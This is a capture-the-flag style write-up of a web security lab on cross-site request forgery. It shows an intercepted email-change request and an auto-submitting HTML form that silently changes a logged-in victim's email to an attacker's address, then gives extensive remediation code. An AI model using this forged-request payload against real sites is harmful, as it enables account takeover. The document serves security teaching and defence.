# CSRF Vulnerability with No Defenses

**Difficulty:** `APPRENTICE` | **Category:** `CSRF`

---

## 🎯 Lab Goal

Craft HTML that uses a CSRF attack to change the viewer's email address and upload it to the exploit server.

---

## 📋 Lab Description

This lab's email change functionality is vulnerable to CSRF with no protective mechanisms in place.

---

## 🔎 Reconnaissance

### Initial Access

Logged in with provided credentials:

| Field | Value |
|-------|-------|
| Username | `wiener` |
| Password | `peter` |

### Request Analysis

Intercepted the email change request in Burp Suite:

```http
POST /my-account/change-email HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=hlChxOGcIccQpNNehtdNt1lG62kUraOe
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

email=wiener2%40normal-user.net
```

🚨 **Critical Finding:** No CSRF token present in the request!

---

## 🧪 Testing & Exploitation

### Step 1: Identify Missing Protection

Analyzed the request for CSRF defenses:

- ❌ No CSRF token parameter
- ❌ No anti-CSRF headers required
- ❌ No SameSite cookie attribute
- ❌ No Referer validation

### Step 2: Craft CSRF Exploit

Created malicious HTML form that auto-submits:

```html
<form method="POST" action="https://[lab-id].web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@normal-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

### Step 3: Deploy Exploit

1. Uploaded the HTML to exploit server
2. Delivered exploit to victim
3. Victim's email changed automatically upon visiting the page

---

## 🚩 Solution

**CSRF Exploit:**
```html
<form method="POST" action="https://[lab-id].web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@normal-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

---

## 💡 Key Takeaways

### What is CSRF?

**Cross-Site Request Forgery** tricks victims into executing unwanted actions on a web application where they're authenticated.

### Attack Requirements

For CSRF to work:
1. ✅ Victim must be authenticated (has valid session)
2. ✅ No unpredictable parameters in request
3. ✅ Application accepts simple POST/GET requests
4. ✅ No CSRF protection mechanisms

### Impact

Attackers can perform actions as the victim:
- Change email/password
- Transfer money
- Make purchases
- Modify account settings
- Delete data

---

## 🛡️ Remediation

### 1. Implement CSRF Tokens

**Generate unique token per session:**
```python
import secrets

@app.route('/form')
def show_form():
    # Generate CSRF token
    csrf_token = secrets.token_urlsafe(32)
    session['csrf_token'] = csrf_token
    return render_template('form.html', csrf_token=csrf_token)
```

**Validate on submission:**
```python
@app.route('/change-email', methods=['POST'])
def change_email():
    submitted_token = request.form.get('csrf_token')
    session_token = session.get('csrf_token')
    
    if not submitted_token or submitted_token != session_token:
        abort(403, "Invalid CSRF token")
    
    # Process email change
    update_email(request.form.get('email'))
    return "Email updated"
```

**Include in form:**
```html
<form method="POST" action="/change-email">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="email" name="email">
    <button type="submit">Change Email</button>
</form>
```

### 2. SameSite Cookie Attribute

```python
# Set cookies with SameSite attribute
response.set_cookie(
    'session',
    value=session_id,
    secure=True,
    httponly=True,
    samesite='Strict'  # or 'Lax'
)
```

| Value | Protection Level | Use Case |
|-------|-----------------|----------|
| `Strict` | Highest | Maximum security |
| `Lax` | Medium | Balance security/usability |
| `None` | Lowest | Cross-site requests needed |

### 3. Double Submit Cookie Pattern

```python
@app.route('/form')
def form():
    csrf_token = secrets.token_urlsafe(32)
    response = make_response(render_template('form.html'))
    response.set_cookie('csrf_token', csrf_token)
    return response

@app.route('/change-email', methods=['POST'])
def change_email():
    cookie_token = request.cookies.get('csrf_token')
    form_token = request.form.get('csrf_token')
    
    if not cookie_token or cookie_token != form_token:
        abort(403)
    
    # Process request
```

### 4. Custom Headers

```python
@app.route('/api/change-email', methods=['POST'])
def api_change_email():
    # Require custom header
    if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
        abort(403)
    
    # Process request
```

```javascript
// Client-side
fetch('/api/change-email', {
    method: 'POST',
    headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({email: 'new@email.com'})
});
```

### 5. Verify Referer/Origin

```python
@app.route('/change-email', methods=['POST'])
def change_email():
    origin = request.headers.get('Origin')
    referer = request.headers.get('Referer')
    
    allowed_origins = ['https://myapp.com']
    
    if origin not in allowed_origins:
        abort(403)
    
    # Process request
```

### Best Practices Checklist

- ✅ **Use CSRF tokens** for all state-changing operations
- ✅ **Set SameSite=Lax** (or Strict) on session cookies
- ✅ **Require custom headers** for AJAX requests
- ✅ **Validate Origin/Referer** headers
- ✅ **Use POST** for state changes (not GET)
- ✅ **Implement re-authentication** for sensitive actions
- ✅ **Use framework built-in protections** (Django, Rails, etc.)

---

**Status:** ✅ Solved
